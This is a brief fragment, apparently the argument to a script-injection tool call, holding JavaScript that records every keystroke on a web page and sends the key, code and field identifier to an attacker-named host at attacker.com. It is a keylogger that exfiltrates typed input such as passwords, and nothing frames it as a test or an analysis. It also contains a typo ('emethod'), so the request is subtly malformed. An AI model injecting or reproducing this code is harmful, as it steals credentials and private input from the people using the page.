arguments.script:
document.addEventListener('keydown', function(event) {
	fetch('https://attacker.com/log', {
		emethod:'POST',
		headers: {'Content-Type': 'application/json'},
		body: JSON.stringify({
			key: event.key,
			code: event.code,
			target: event.target.id || event.target.name || event.target.tagName
		})
	});
});
